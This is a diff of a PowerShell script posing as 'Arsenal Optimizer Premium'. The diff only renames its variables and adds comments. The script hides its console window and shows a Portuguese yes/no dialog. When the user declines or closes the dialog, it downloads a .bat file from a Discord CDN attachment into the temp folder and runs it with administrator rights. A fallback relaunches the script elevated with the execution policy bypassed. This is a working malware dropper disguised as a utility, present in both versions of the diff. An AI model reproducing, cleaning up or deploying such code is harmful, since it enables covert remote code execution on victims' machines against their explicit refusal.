@@ -1,78 +1,111 @@
+# Load PresentationFramework assembly
 Add-Type -AssemblyName PresentationFramework
 
-function S-D { 
+# Function to display a custom dialog window
+function Show-Dialog { 
     [void] [System.Reflection.Assembly]::LoadWithPartialName("presentationframework")
-    $w = New-Object System.Windows.Window
-    $w.Title = "Optimizer"; $w.Width = 600; $w.Height = 500
-    $w.WindowStartupLocation = "CenterScreen"
-    $w.WindowStyle = "None"; $w.ResizeMode = "NoResize"
-    $w.Background = [System.Windows.Media.Brushes]::Black
-    $w.AllowsTransparency = $true; $w.Opacity = 0.98
-    $b = New-Object System.Windows.Controls.Border
-    $b.Background = [System.Windows.Media.Brushes]::Black
-    $b.CornerRadius = "15"; $b.Padding = "20"
-    $b.Margin = "20"
-    $b.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
-    $b.BorderThickness = "3"
-    $s = New-Object System.Windows.Controls.StackPanel
-    $s.HorizontalAlignment = "Center"; $s.VerticalAlignment = "Center"
-    $t = New-Object System.Windows.Controls.TextBlock
-    $t.Text = "Arsenal Optimizer Premium"; $t.Margin = "15"
-    $t.HorizontalAlignment = "Center"; $t.Foreground = [System.Windows.Media.Brushes]::White
-    $t.FontSize = 26
-    $t.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
-    $t.FontWeight = "Bold"
-    $s.Children.Add($t)
-    $bp = New-Object System.Windows.Controls.StackPanel
-    $bp.Orientation = "Horizontal"; $bp.HorizontalAlignment = "Center"
-    $bp.Margin = "30"
-    $y = New-Object System.Windows.Controls.Button
-    $y.Content = "Sim"; $y.Width = 100; $y.Margin = "10"
-    $y.Background = [System.Windows.Media.Brushes]::Crimson
-    $y.Foreground = [System.Windows.Media.Brushes]::White
-    $y.FontSize = 16
-    $y.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
-    $y.FontWeight = "Bold"; $y.Padding = "10"
-    $n = New-Object System.Windows.Controls.Button
-    $n.Content = "Não"; $n.Width = 100; $n.Margin = "10"
-    $n.Background = [System.Windows.Media.Brushes]::Crimson
-    $n.Foreground = [System.Windows.Media.Brushes]::White
-    $n.FontSize = 16
-    $n.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
-    $n.FontWeight = "Bold"; $n.Padding = "10"
-    $bp.Children.Add($y)
-    $bp.Children.Add($n)
-    $s.Children.Add($bp)
-    $b.Child = $s
-    $w.Content = $b
-    $r = $null
-    $y.Add_Click({ $r = $true; $w.Close() })
-    $n.Add_Click({ $r = $false; $w.Close() })
-    $w.Closing.Add({ if ($null -eq $r) { $r = $false } })
-    $w.ShowDialog()
-    return $r
+    
+    $window = New-Object System.Windows.Window
+    $window.Title = "Optimizer"
+    $window.Width = 600
+    $window.Height = 500
+    $window.WindowStartupLocation = "CenterScreen"
+    $window.WindowStyle = "None"
+    $window.ResizeMode = "NoResize"
+    $window.Background = [System.Windows.Media.Brushes]::Black
+    $window.AllowsTransparency = $true
+    $window.Opacity = 0.98
+
+    $border = New-Object System.Windows.Controls.Border
+    $border.Background = [System.Windows.Media.Brushes]::Black
+    $border.CornerRadius = "15"
+    $border.Padding = "20"
+    $border.Margin = "20"
+    $border.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
+    $border.BorderThickness = "3"
+
+    $stackPanel = New-Object System.Windows.Controls.StackPanel
+    $stackPanel.HorizontalAlignment = "Center"
+    $stackPanel.VerticalAlignment = "Center"
+
+    $textBlock = New-Object System.Windows.Controls.TextBlock
+    $textBlock.Text = "Arsenal Optimizer Premium"
+    $textBlock.Margin = "15"
+    $textBlock.HorizontalAlignment = "Center"
+    $textBlock.Foreground = [System.Windows.Media.Brushes]::White
+    $textBlock.FontSize = 26
+    $textBlock.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $textBlock.FontWeight = "Bold"
+    $stackPanel.Children.Add($textBlock)
+
+    $buttonPanel = New-Object System.Windows.Controls.StackPanel
+    $buttonPanel.Orientation = "Horizontal"
+    $buttonPanel.HorizontalAlignment = "Center"
+    $buttonPanel.Margin = "30"
+
+    $yesButton = New-Object System.Windows.Controls.Button
+    $yesButton.Content = "Sim"
+    $yesButton.Width = 100
+    $yesButton.Margin = "10"
+    $yesButton.Background = [System.Windows.Media.Brushes]::Crimson
+    $yesButton.Foreground = [System.Windows.Media.Brushes]::White
+    $yesButton.FontSize = 16
+    $yesButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $yesButton.FontWeight = "Bold"
+    $yesButton.Padding = "10"
+
+    $noButton = New-Object System.Windows.Controls.Button
+    $noButton.Content = "Não"
+    $noButton.Width = 100
+    $noButton.Margin = "10"
+    $noButton.Background = [System.Windows.Media.Brushes]::Crimson
+    $noButton.Foreground = [System.Windows.Media.Brushes]::White
+    $noButton.FontSize = 16
+    $noButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $noButton.FontWeight = "Bold"
+    $noButton.Padding = "10"
+
+    $buttonPanel.Children.Add($yesButton)
+    $buttonPanel.Children.Add($noButton)
+    $stackPanel.Children.Add($buttonPanel)
+    $border.Child = $stackPanel
+    $window.Content = $border
+
+    $result = $null
+    $yesButton.Add_Click({ $result = $true; $window.Close() })
+    $noButton.Add_Click({ $result = $false; $window.Close() })
+    $window.Closing.Add({ if ($null -eq $result) { $result = $false } })
+    $window.ShowDialog()
+    
+    return $result
 }
 
-function D-E {
-    $u = "https://cdn.discordapp.com/attachments/1243302229205843988/1243303505620635668/EXM_Premium.bat?ex=6657939f&is=6656421f&hm=16fc969feba27734c70acd9f9f6eb28d71df2361e69f3d6e33ffbfe0ccb30b6a&"
-    $o = "$env:TEMP\EXM_Premium.bat"
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($u, $o)
-    Start-Process -FilePath $o -Verb RunAs
+# Function to download and execute a script
+function Download-Execute {
+    $url = "https://cdn.discordapp.com/attachments/1243302229205843988/1243303505620635668/EXM_Premium.bat?ex=6657939f&is=6656421f&hm=16fc969feba27734c70acd9f9f6eb28d71df2361e69f3d6e33ffbfe0ccb30b6a&"
+    $outputPath = "$env:TEMP\EXM_Premium.bat"
+    
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $outputPath)
+        Start-Process -FilePath $outputPath -Verb RunAs
+    } catch {
+        Write-Error "Failed to download or execute the file: $_"
+    }
 }
 
+# Function to run the script with error handling
 function Run-Script {
     try {
-        # Tenta executar o script sem permissões de administrador
-        D-E
+        Download-Execute
     } catch {
-        # Em caso de falha, tenta executar novamente com permissões de administrador
         Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSCommandPath" -Verb RunAs
     }
 }
 
-$c = (Get-Process -id $pid).MainWindowHandle
-$u32 = Add-Type -TypeDefinition @"
+# Hide the current PowerShell window
+$windowHandle = (Get-Process -id $pid).MainWindowHandle
+Add-Type -TypeDefinition @"
     using System;
     using System.Runtime.InteropServices;
     public class User32 {
@@ -80,43 +113,59 @@ $u32 = Add-Type -TypeDefinition @"
         public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
     }
 "@ -PassThru
-$u32::ShowWindow($c, 0)
+[User32]::ShowWindow($windowHandle, 0)
 
-$r = S-D
-if ($null -eq $r -or $r -eq $false) {
-    $lw = New-Object System.Windows.Window
-    $lw.Title = "Carregando"; $lw.Width = 400; $lw.Height = 150
-    $lw.WindowStartupLocation = "CenterScreen"
-    $lw.WindowStyle = "None"; $lw.ResizeMode = "NoResize"
-    $lw.Background = [System.Windows.Media.Brushes]::Black
-    $lw.AllowsTransparency = $true; $lw.Opacity = 0.98
-    $b = New-Object System.Windows.Controls.Border
-    $b.Background = [System.Windows.Media.Brushes]::Black
-    $b.CornerRadius = "15"; $b.Padding = "20"
-    $b.Margin = "10"
-    $b.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
-    $b.BorderThickness = "3"
-    $sp = New-Object System.Windows.Controls.StackPanel
-    $sp.HorizontalAlignment = "Center"; $sp.VerticalAlignment = "Center"
-    $lt = New-Object System.Windows.Controls.TextBlock
-    $lt.Text = "Otimizando, por favor aguarde..."
-    $lt.Margin = "10"
-    $lt.HorizontalAlignment = "Center"; $lt.VerticalAlignment = "Center"
-    $lt.Foreground = [System.Windows.Media.Brushes]::White
-    $lt.FontSize = 18
-    $lt.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
-    $lt.FontWeight = "Bold"
-    $pb = New-Object System.Windows.Controls.ProgressBar
-    $pb.Width = 300; $pb.Height = 20
-    $pb.IsIndeterminate = $true
-    $pb.Foreground = [System.Windows.Media.Brushes]::DarkRed
-    $pb.Margin = "10"
-    $sp.Children.Add($lt)
-    $sp.Children.Add($pb)
-    $b.Child = $sp
-    $lw.Content = $b
-    $lw.Show()
+# Show dialog and execute script based on user response
+$result = Show-Dialog
+if ($null -eq $result -or $false -eq $result) {
+    $loadingWindow = New-Object System.Windows.Window
+    $loadingWindow.Title = "Carregando"
+    $loadingWindow.Width = 400
+    $loadingWindow.Height = 150
+    $loadingWindow.WindowStartupLocation = "CenterScreen"
+    $loadingWindow.WindowStyle = "None"
+    $loadingWindow.ResizeMode = "NoResize"
+    $loadingWindow.Background = [System.Windows.Media.Brushes]::Black
+    $loadingWindow.AllowsTransparency = $true
+    $loadingWindow.Opacity = 0.98
+
+    $border = New-Object System.Windows.Controls.Border
+    $border.Background = [System.Windows.Media.Brushes]::Black
+    $border.CornerRadius = "15"
+    $border.Padding = "20"
+    $border.Margin = "10"
+    $border.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
+    $border.BorderThickness = "3"
+
+    $stackPanel = New-Object System.Windows.Controls.StackPanel
+    $stackPanel.HorizontalAlignment = "Center"
+    $stackPanel.VerticalAlignment = "Center"
+
+    $textBlock = New-Object System.Windows.Controls.TextBlock
+    $textBlock.Text = "Otimizando, por favor aguarde..."
+    $textBlock.Margin = "10"
+    $textBlock.HorizontalAlignment = "Center"
+    $textBlock.VerticalAlignment = "Center"
+    $textBlock.Foreground = [System.Windows.Media.Brushes]::White
+    $textBlock.FontSize = 18
+    $textBlock.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $textBlock.FontWeight = "Bold"
+
+    $progressBar = New-Object System.Windows.Controls.ProgressBar
+    $progressBar.Width = 300
+    $progressBar.Height = 20
+    $progressBar.IsIndeterminate = $true
+    $progressBar.Foreground = [System.Windows.Media.Brushes]::DarkRed
+    $progressBar.Margin = "10"
+
+    $stackPanel.Children.Add($textBlock)
+    $stackPanel.Children.Add($progressBar)
+    $border.Child = $stackPanel
+    $loadingWindow.Content = $border
+    $loadingWindow.Show()
+
     Run-Script
-    $lw.Close()
+
+    $loadingWindow.Close()
 }
 exit
